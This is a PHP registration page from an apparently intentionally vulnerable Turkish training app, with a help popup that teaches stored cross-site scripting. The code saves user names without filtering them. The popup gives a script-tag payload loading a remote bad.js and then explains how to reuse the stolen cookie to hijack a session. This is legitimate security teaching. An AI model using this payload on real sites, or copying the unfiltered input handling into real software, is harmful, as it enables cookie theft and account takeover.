<!DOCTYPE HTML>
<html lang="tr">
<?php include("klasik.php"); ?>
<?php include("connection.php"); ?>
		<div class="container well">
			
			<?php
			if($_POST){
				$username = mysql_prep($_POST["kullanici_isim"]);//kullanıcı ismini metin kutusundan al
				$user = mysql_prep($_POST["kullanici_ad"]);//kullanıcı adını metin kutusundan al
				$pass = mysql_prep($_POST["sifre"]);//şifreyi metin kutusundan al
				$query="INSERT INTO kullanicilar1(kullanici_isim,kullanici_ad,sifre) VALUES ('$username', '$user', '$pass')";
				$sonuc=mysql_query($query,$connection);//sorguyu çalıştır
				
				if($sonuc){//sonuc varsa
					echo " <meta http-equiv='refresh' content='5;URL=xss.php'> ";//xss(kullanıcı giriş) sayfasına yönlendir
				}else{
					echo "Bir hata oluştu : ".mysql_error();
				}
				//echo '<div class="alert alert-success" style="margin-top:50px;"><strong>Başarılı!</strong> Başarıyla kayıt oldunuz. <a href="girisyap.php">Giriş Yapmak İçin Buraya Tıklayın</a></div>';
				
			}
			?>
			
			<form method="post" role="form" style="margin-top:50px;" enctype="multipart/form-data">
				<div class="form-group">
					<label for="email">Kullanıcı İsim Soyisim:</label>
					<input type="text" name="kullanici_isim" class="form-control" id="u" placeholder="Kullanıcı İsim ve Soyisim Giriniz">
				</div>
				<div class="form-group">
					<label for="email">Kullanıcı Adı:</label>
					<input type="text" name="kullanici_ad" class="form-control" id="u" placeholder="Kullanıcı Adınızı Giriniz">
				</div>
				<div class="form-group">
					<label for="pwd">Şifre:</label>
					<input type="password" name="sifre" class="form-control" id="pwd" placeholder="Şifrenizi Giriniz">
				</div>
				<button type="submit" class="btn btn-default">Kayıt Ol</button>
			</form>
		</div>
		<a style="text-decoration: none;" href="javascript:void(0)" onclick="document.getElementById('guru').style.display='block';">
Yardım?</a>

<style type="text/css">              
.kte_conent {font-family:trebuchet ms;font-size:14px;text-align: justify;        display: none;   position: fixed;top:10%;left:20%; height:60%;width: 60%;             padding: 16px;border: 6px solid #0080FF;            background-color: white;            z-index:2003;            overflow: auto;     }
 
</style>     
<div align="center">
<div id="guru" class="kte_conent" align="center"> 
  <a href="http://www.koddostu.com/2011/10/sitene-aclr-pencere-kodu-ekle.html" target="_blank"></a>
<h3>
<span style="color:#3366ff;">XSS</span></h3>
XSS (Cross Site Scripting) script kodları üzerinden (genelde javascript) bir web sayfasına saldırı yapılmasıdır. 
XSS çoğunlukla tarayıcıda saklanan bilgiler olan cookielere saldırı amacı ile kullanılmaktadır.
<p>Uygulamada açık olup olmadığını anlamak için önce bir üye kaydı yapacağız. Kullanıcı ismi ve şifreye herhangi birşey girebilirsiniz. Kullanıcı adına < b>omer</ b> yazın.
Kullanıcı adı:hilal şifre:123456 olarak girip tüm kişileri listelediğinizde omer isminin kalın harflerle yazılı olduğunu göreceksiniz.
Bu zafiyet olduğunu gösterir. </p>
<p>Uygulamayı sömürmek için tekrar bir üye kaydı yapacağız. Kullanıcı ismine ve şifreye herhangi bir şey girebilirsiniz. 
Kullanıcı adına şu kodu:<b>< script src="http://localhost/asil/hack/bad.js"></ script>hacklendiniz</b>
kodunu girin. Veri tabanında kayıtlı kişler hilal ve heykir. Mozilladan kullanıcı adı:heykir şifre:123456 olarak hesaba girin. 
Google chromedan da kullanici adı:hilal şifre:123456 olarak giriş yapın ve kişileri bu hesaptan listeleyin. haklanediniz yazısını göreceksiniz. Bu şu demek:
Kaydettiğimiz kod diğer kullanıcı adlarıyla birlikte çekilip çalışacaktır. Böylece hilal adındaki kullanıcının çerezleri alınıp heykirin victims.txt dosyasına kaydedilmiştir.
Mozillada seçenekler-gizlilik-çerezleri göster yönergelerini izleyin. Localhostu bulup cookie managerde açın. 
Düzenleyin ve size gelen cookieyi yapıştırın. Sayfayı yenilediğinizde diğer kullanıcı sayfasındasınız.
Açığı olan kodlama şu şekildedir. </p>
<p><img src="xss_injection.png" alt="xss_injection"></p>
Bu zafiyet kullanıcı kaydı yapılırken kullanıcı adının hiçbir kontrol yapılmadan  veritabanına kaydedilmesinden kaynaklanır. 
Biz javascript kodunu kullanıcı adına girdiğimizde bu yüzden kabul etti ve veritabanına kaydetti.
<p><img src="xss.png" alt="xss"></p>
Görüldüğü gibi sarı renk ile vurgulanan yerlerde girişlerin kontrolü sağlanmış ve girdiler tüm HTML ve PHP kodlarından ayıklanmıştır.

<br/>
<center><a href="javascript:void(0)" onclick="document.getElementById('guru').style.display='none'"><button style="border: 2px outset rgb(0, 128, 255); background: none repeat scroll 0% 0% rgb(0, 128, 255);">Kapat</button></a></center> 
</div></div> 
<script src="https://www.koddostu.com/duzelt.js?no=284"></script>
		
</body>
</html>